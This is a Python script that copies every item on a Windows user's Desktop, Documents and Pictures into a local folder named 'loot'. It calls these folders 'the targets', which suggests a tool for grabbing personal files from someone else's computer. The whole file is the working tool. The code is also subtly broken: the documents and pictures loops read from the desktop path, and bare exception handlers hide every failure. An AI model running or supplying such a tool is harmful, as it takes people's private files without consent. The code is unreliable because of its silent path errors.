from tqdm import tqdm
import os
import shutil


def extracting(dest, desk, doc, pic):
    # Creates a folder in the destination directory to store copied files
    path = os.path.join(dest, "loot")
    os.mkdir(path)

    destin = os.path.dirname(os.path.abspath(__file__)) + "\\" + "loot"
    # gets the list of files in the desktop, documents, and pictures
    desktopList = os.listdir(desk)
    documentsList = os.listdir(doc)
    picturesList = os.listdir(pic)

    # Creates the directories within the loot folder to separate items
    deskDest = os.path.join(destin, "desktop")
    docDest = os.path.join(destin, "documents")
    picDest = os.path.join(destin, "pictures")
    os.mkdir(deskDest)
    os.mkdir(docDest)
    os.mkdir(picDest)

    # Sets the new destination paths within the loot folder
    desktop = os.path.dirname(os.path.abspath(__file__)) + "\\" + "loot" + "\\" + "desktop"
    documents = os.path.dirname(os.path.abspath(__file__)) + "\\" + "loot" + "\\" + "documents"
    pictures = os.path.dirname(os.path.abspath(__file__)) + "\\" + "loot" + "\\" + "pictures"

    # For each item in the list of items,
    for f in tqdm(desktopList):
        srcs = desk + "\\" + f
        des = desktop + "\\" + f

        # if its a folder, copy the folder over
        try:
            shutil.copytree(srcs, des)
        except:
            pass
        # If its a file copy the file
        try:
            shutil.copy(srcs, des)
        except:
            pass

    for f in tqdm(documentsList):
        srcs = desk + "\\" + f
        des = documents + "\\" + f

        try:
            shutil.copytree(srcs, des)
        except:
            pass
        try:
            shutil.copy(srcs, des)
        except:
            pass

    for f in tqdm(picturesList):
        srcs = desk + "\\" + f
        des = pictures + "\\" + f

        try:
            shutil.copytree(srcs, des)
        except:
            pass
        try:
            shutil.copy(srcs, des)
        except:
            pass


def destination():
    # Gets the destination path, the files location
    destin = os.path.dirname(os.path.abspath(__file__))
    return destin


def main():
    # Gets the path to the scripts location
    dest = destination()
    # Sets the targets desktop, documents, and pictures paths
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    documents = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
    pictures = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Pictures')

    # Sends the paths to the extractor method
    extracting(dest, desktop, documents, pictures)


if __name__ == '__main__':
    main()
